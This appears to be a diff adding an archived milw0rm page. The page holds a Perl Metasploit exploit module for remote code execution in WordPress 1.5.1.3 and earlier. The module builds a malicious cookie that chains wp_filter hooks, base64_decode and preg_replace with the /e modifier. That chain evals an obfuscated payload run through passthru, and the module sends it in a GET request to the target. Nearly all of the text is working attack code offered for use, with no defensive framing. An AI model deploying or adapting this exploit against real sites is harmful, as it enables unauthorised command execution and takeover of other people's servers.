@@ -1,0 +1,125 @@
+<html><head><title>Wordpress <= 1.5.1.3 Remote Code Execution eXploit (metasploit)</title></head><pre>##
+#        Title:  Wordpress &lt;= 1.5.1.3 Remote Code Execution eXploit (metasploit)
+#    Name: php_wordpress.pm
+# License: Artistic/BSD/GPL
+#         Info: I lub metasploit yummmm (str0ke ! milw0rm.com).
+#
+# Recoded Kartoffelguru's php code for metasploit.  I love cookies. /str0ke
+#  
+#
+#
+#  - This is an exploit module for the Metasploit Framework, please see
+#     http://metasploit.com/projects/Framework for more information.
+# 
+##
+
+package Msf::Exploit::php_wordpress;
+use base &quot;Msf::Exploit&quot;;
+use strict;
+use Pex::Text;
+use bytes;
+
+my $advanced = { };
+
+my $info = {
+        'Name'     =&gt; 'Wordpress &lt;= 1.5.1.3 Remote Code Execution eXploit',
+        'Version'  =&gt; '$Revision: 1.0 $',
+        'Authors'  =&gt; [ 'str0ke' ],
+        'Arch'     =&gt; [ ],
+        'OS'       =&gt; [ ],
+        'Priv'     =&gt; 0,
+        'UserOpts' =&gt;
+          {
+                'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+                'RPORT' =&gt; [1, 'PORT', 'The target port', 80],
+                'VHOST' =&gt; [0, 'DATA', 'The virtual host name of the server'],
+                'RPATH' =&gt; [1, 'DATA', 'Path WordPress root directory', '/'],
+                'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
+          },
+
+        'Description' =&gt; Pex::Text::Freeform(qq{
+                This module exploits a code execution exploit in wordpress blog &lt;= 1.5.1.3.
+}),
+
+        'Refs' =&gt;
+          [
+                ['MIL', '1142'],
+          ],
+
+        'Payload' =&gt;
+          {
+                'Space' =&gt; 512,
+                'Keys'  =&gt; ['cmd', 'cmd_bash'],
+          },
+
+        'Keys' =&gt; ['wordpress'],
+  };
+
+sub new {
+        my $class = shift;
+        my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+        return($self);
+}
+
+sub Exploit {
+        my $self = shift;
+        my $target_host    = $self-&gt;GetVar('RHOST');
+        my $target_port    = $self-&gt;GetVar('RPORT');
+        my $vhost          = $self-&gt;GetVar('VHOST') || $target_host;
+        my $path           = $self-&gt;GetVar('RPATH');
+        my $cmd            = $self-&gt;GetVar('EncodedPayload')-&gt;RawPayload;
+
+        my $encoded = Pex::Text::Base64Encode(&quot;passthru(\&quot;$cmd\&quot;);&quot;);
+        $encoded =~ s/\n//gm;
+
+        my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $encoded));
+
+        $byte.=&quot;.chr(32)&quot;;
+
+        my $str = Pex::Text::Base64Encode('args[0]=eval(base64_decode('.$byte.')).die()&amp;args[1]=x');
+
+        $str =~ s/\n//gm;
+
+        my $data = &quot;wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;&quot;.
+                   &quot;wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;&quot;.
+                   &quot;cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=$str&quot;.
+                   &quot;;wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;&quot;.
+                   &quot;wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;&quot;.
+                   &quot;wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;&quot;;
+
+        my $req =
+                &quot;GET $path HTTP/1.0\r\n&quot;.
+                &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\r\n&quot;.
+                &quot;Host: $vhost:$target_port\r\n&quot;.
+                &quot;Pragma: no-cache\r\n&quot;.
+                &quot;Accept: */*\r\n&quot;.
+                &quot;Cookie: $data\r\n&quot;.
+                &quot;\r\n&quot;;
+
+        my $s = Msf::Socket::Tcp-&gt;new(
+                'PeerAddr'  =&gt; $target_host,
+                'PeerPort'  =&gt; $target_port,
+                'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+                'SSL'       =&gt; $self-&gt;GetVar('SSL'),
+
+          );
+
+        if ($s-&gt;IsError){
+                $self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+                return;
+        }
+
+        $self-&gt;PrintLine(&quot;[*] Sending the malicious WordPress Get request...&quot;);
+
+        $s-&gt;Send($req);
+
+        my $results = $s-&gt;Recv(-1, 20);
+        $s-&gt;Close();
+        $self-&gt;PrintLine($results);
+
+        return;
+}
+
+1;
+
+# milw0rm.com [2005-08-10]</pre></html>
